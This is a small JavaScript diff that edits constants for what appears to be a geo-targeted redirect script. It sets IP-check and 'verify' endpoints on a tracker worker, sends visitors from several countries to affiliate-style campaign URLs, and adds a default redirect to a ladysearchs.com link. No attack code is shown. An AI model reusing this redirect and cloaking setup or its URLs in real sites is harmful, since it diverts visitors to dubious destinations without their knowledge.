@@ -2,10 +2,10 @@
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
 const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
 const se_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
-const no_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
+const no_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=123729&s1=G20&s2=G20';
 const ch_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=120583&s1=G20&s2=G20';
 const de_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=146265&s1=G20&s2=G20';
-// DEFAULT_REDIRECT_URL removed — Norway is now the fallback for all unmatched countries.
+const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
 
 // ========== GLOBAL STATE ==========
 let userCountry = '';
